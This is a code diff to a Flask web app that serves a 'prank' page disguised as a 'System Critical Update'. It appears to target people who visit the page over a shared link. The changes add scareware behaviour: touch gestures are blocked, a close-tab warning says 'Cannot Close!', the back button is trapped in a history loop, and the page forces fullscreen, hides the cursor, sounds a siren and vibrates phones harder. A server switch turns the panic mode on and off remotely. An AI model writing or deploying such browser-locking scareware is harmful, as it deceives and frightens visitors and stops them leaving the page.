@@ -5,6 +5,7 @@ app = Flask(__name__)
 # --- SERVER STATE (Memory) ---
 # True = Freeze Mode ON
 # False = Normal Mode
+# Restart hole default 'True' thakbe
 server_state = {"frozen": True}
 
 # ==========================================
@@ -14,21 +15,21 @@ prank_html = """
 <!DOCTYPE html>
 <html>
 <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>System Verification</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Critical Update</title>
     <style>
         /* General Styles */
-        body { margin: 0; overflow: hidden; background: #111; font-family: 'Courier New', monospace; user-select: none; -webkit-user-select: none; }
+        body { margin: 0; overflow: hidden; background: #000; font-family: 'Courier New', monospace; user-select: none; -webkit-user-select: none; }
         
-        /* The Trap Button Screen */
-        #safe { display: flex; height: 100vh; flex-direction: column; justify-content: center; align-items: center; color: white; text-align: center; background: #000; transition: opacity 0.5s;}
+        /* The Trap Button Screen (Safe Mode) */
+        #safe { display: flex; height: 100vh; flex-direction: column; justify-content: center; align-items: center; color: white; text-align: center; background: #111; transition: opacity 0.2s;}
         .btn { padding: 15px 40px; background: #00ff00; color: black; border: none; font-size: 18px; font-weight: bold; border-radius: 5px; cursor: pointer; margin-top: 20px; box-shadow: 0 0 15px #00ff00; animation: pulse 1s infinite;}
         
-        /* The SCARY Overlay */
+        /* The SCARY Overlay (Panic Mode) */
         #overlay {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.98); color: red; flex-direction: column;
-            justify-content: center; align-items: center; text-align: center; z-index: 9999;
+            justify-content: center; align-items: center; text-align: center; z-index: 99999;
             cursor: none; /* Mouse Gayeb for Laptop */
         }
         
@@ -61,7 +62,19 @@ prank_html = """
         let isPlaying = false;
         let hasInteracted = false;
 
-        // --- 1. ACTIVATION (Sound & Fullscreen) ---
+        // --- 1. PREVENT SCROLL & SWIPE GESTURES ---
+        // Eta 'Pull to Refresh' ar 'Scroll' bondho korbe
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+
+        // --- 2. EXIT TRAP (Show Popup on Close) ---
+        // Keu tab close ba swipe up korle browser warning debe
+        window.onbeforeunload = function() {
+            return "System Error: Cannot Close!";
+        };
+
+        // --- 3. ACTIVATION ---
         function startPrank() {
             if(hasInteracted) return;
             hasInteracted = true;
@@ -69,13 +82,13 @@ prank_html = """
             // Go Fullscreen
             if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
             
-            // Trap Back Button
+            // Trap Back Button (History Loop)
             history.pushState(null, null, location.href);
             window.onpopstate = function () {
                 history.pushState(null, null, location.href);
             };
 
-            // Initialize Audio Context (Browser requirement)
+            // Initialize Audio Context
             if (!audioCtx) {
                 audioCtx = new (window.AudioContext || window.webkitAudioContext)();
             }
@@ -83,7 +96,7 @@ prank_html = """
             document.getElementById('safe').innerHTML = "<h1 style='color:white'>Verifying...</h1>";
         }
 
-        // --- 2. SOUND GENERATOR (Siren) ---
+        // --- 4. SOUND GENERATOR (Siren) ---
         function playAlarm() {
             if (isPlaying || !audioCtx) return;
             oscillator = audioCtx.createOscillator();
@@ -98,7 +111,7 @@ prank_html = """
             oscillator.start();
             isPlaying = true;
 
-            // Modulate pitch to make it sound like a siren
+            // Modulate pitch (Siren Effect)
             window.sirenInterval = setInterval(() => {
                 if(oscillator.frequency.value == 800) oscillator.frequency.value = 500;
                 else oscillator.frequency.value = 800;
@@ -114,7 +127,7 @@ prank_html = """
             }
         }
 
-        // --- 3. SERVER POLLING (The Brain) ---
+        // --- 5. SERVER POLLING (The Brain) ---
         setInterval(() => {
             fetch('/status')
                 .then(res => res.json())
@@ -130,8 +143,8 @@ prank_html = """
                         // Laptop: Hide Cursor
                         document.body.style.cursor = 'none';
 
-                        // Mobile: Vibrate
-                        if(navigator.vibrate) navigator.vibrate([200, 100, 200, 100]); 
+                        // Mobile: Vibrate (Strong)
+                        if(navigator.vibrate) navigator.vibrate([400, 100, 400, 100]); 
                         
                         // Sound: Play
                         if(audioCtx && audioCtx.state === 'suspended') audioCtx.resume();
@@ -230,5 +243,5 @@ def toggle():
     return jsonify(server_state)
 
 if __name__ == '__main__':
-    # Running on 0.0.0.0 to allow network access (via Ngrok)
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    # Running on 0.0.0.0
+    app.run(host='0.0.0.0', port=5000)
